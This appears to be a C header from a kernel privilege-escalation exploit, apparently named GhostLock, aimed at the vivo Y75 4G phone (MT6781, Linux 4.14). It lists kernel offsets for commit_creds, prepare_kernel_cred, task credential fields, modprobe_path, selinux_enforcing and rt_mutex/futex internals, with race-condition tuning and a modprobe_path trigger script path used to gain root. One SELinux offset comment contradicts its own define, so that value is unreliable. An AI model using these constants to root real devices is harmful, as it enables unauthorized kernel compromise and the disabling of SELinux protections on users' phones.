/* target_y75.h - vivo Y75 4G (PD2150CF / MT6781 Helio G96)
 * Kernel: 4.14.186-gdfd963175-dirty
 * Arch: ARM64, 4KB pages, 39-bit VA
 * KASLR: ON - use perf_leak to get runtime base each boot
 * Compiled base: 0xffffff8008000000 (_stext = 0xffffff8008080800)
 */

#ifndef TARGET_Y75_H
#define TARGET_Y75_H

/* Memory layout */
#define KIMAGE_TEXT_BASE_STATIC  0xffffff8008000000ULL
#define PAGE_OFFSET_KERNEL       0xffffffc000000000ULL
#define PAGE_SHIFT               12
#define PAGE_SIZE                4096
#define VA_BITS                  39

/* Credential functions - Ghidra confirmed */
#define COMMIT_CREDS_OFF         0x000e6170ULL
#define PREPARE_KERNEL_CRED_OFF  0x000e6508ULL

/* task_struct offsets - Ghidra confirmed */
#define TASK_CRED_OFF            0x640
#define TASK_REAL_CRED_OFF       0x638

/* Futex core - kallsyms confirmed */
#define DO_FUTEX_OFF             0x0018caa8ULL  /* ffffff800818caa8 */
#define REMOVE_WAITER_OFF        0x0013d7d4ULL  /* ffffff800813d7d4 */

/* Ashmem - kallsyms confirmed */
#define ASHMEM_FOPS_OFF          0x011ed3c0ULL  /* ffffff80093ed3c0 */
#define ASHMEM_IOCTL_OFF         0x00d70018ULL  /* ffffff8008d70018 */
#define ASHMEM_MMAP_OFF          0x00d70728ULL  /* ffffff8008d70728 */
#define ASHMEM_OPEN_OFF          0x00d70894ULL  /* ffffff8008d70894 */
#define ASHMEM_RELEASE_OFF       0x00d70928ULL  /* ffffff8008d70928 */

/* Security - kallsyms confirmed */
#define SECURITY_HOOK_HEADS_OFF  0x01913f20ULL  /* ffffff8009993f20 */
#define MODPROBE_PATH_OFF        0x023bc9a0ULL  /* ffffff800a43c9a0 */

/* init_task - derived from __start_init_task */
#define INIT_TASK_OFF            0x02410000ULL  /* ffffff800a410000 */

/* selinux_enforcing - NEEDS GHIDRA VERIFICATION */
/* selinux_state = 0xffffff8009994b08, enforcing at +0x4 */
#define SELINUX_ENFORCING_OFF    0x01994b08ULL  /* selinux_state.enforcing, bool at offset 0x0 */

/* GhostLock config */
#define WAIT_ROUTE_SECONDS       8
#define PSELECT_NFDS             320
#define PSELECT_TIMEOUT_SEC      5
#define CONSUMER_NICE            19
#define CONSUMER_CORE            1
#define MAIN_CORE                0
#define RACE_ROUNDS              300
#define RACE_CHILDREN            8

/* modprobe_path trigger */
#define MODPROBE_TRIGGER_FILE    "/data/local/tmp/r.sh"
#define MODPROBE_ROOT_MARKER     "/data/local/tmp/rooted"

/* Runtime resolve macro */
#define OFFSET(off) (kaslr_base + (off))

#endif /* TARGET_Y75_H */

/* rt_mutex_waiter struct offsets - Ghidra rt_mutex_init_waiter confirmed */
#define WAITER_TASK_OFF          0x18
#define WAITER_LOCK_OFF          0x38
#define WAITER_RB_ENTRY_OFF      0x00

/* rt_mutex rbtree root offset - Ghidra rt_mutex_adjust_prio_chain line 249 */
#define RT_MUTEX_WAITERS_OFF     0x8c8

/* rbtree functions - kallsyms confirmed */
#define RB_ERASE_CACHED_OFF      0x01263580ULL
#define RB_INSERT_COLOR_CACHED_OFF 0x0126343cULL

/* rt_mutex_adjust_prio_chain - kallsyms confirmed */
#define RT_MUTEX_ADJUST_PRIO_CHAIN_OFF 0x0013c9e4ULL

/* task_struct additional offsets - Ghidra task_blocks_on_rt_mutex confirmed */
#define TASK_PI_BLOCKED_ON_OFF   0x8e0
#define TASK_PI_LOCK_OFF         0x8bc
#define TASK_PRIO_OFF            0xbc
#define TASK_DEADLINE_OFF        0x3c8
#define WAITER_LOCK_OFF_REAL     0x38  /* corrected from 0x30 */
